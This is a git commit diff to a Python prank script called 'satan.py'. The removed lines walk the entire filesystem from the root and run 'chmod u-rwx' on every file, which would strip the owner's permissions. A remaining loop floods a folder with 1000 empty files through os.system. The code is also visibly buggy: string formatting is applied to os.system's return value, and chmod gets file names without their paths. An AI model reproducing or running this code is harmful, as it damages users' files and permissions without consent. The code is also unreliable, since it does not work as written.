17456a530598208527ff0e9610f08f713db076f5
cisnerosa2000 <cisnerosa2000@gmail.com>
2016-12-07 14:43:52 -0600

    Update satan.py

--- satan.py
+++ satan.py
@@ -1,10 +1,5 @@
 import os
 def is_ascii(s):
     return all(ord(c) < 128 for c in s)
-for i in xrange(300):
+for i in xrange(0x3E8):
     os.system("touch documents/%s.txt") % i
-for roots, dirs, files in os.walk("/"):
-   for f in files:
-      filename = f if is_ascii(f) else "unicode"
-      os.system("chmod u-rwx %s" % filename)
-#From Adrian, with love ;O
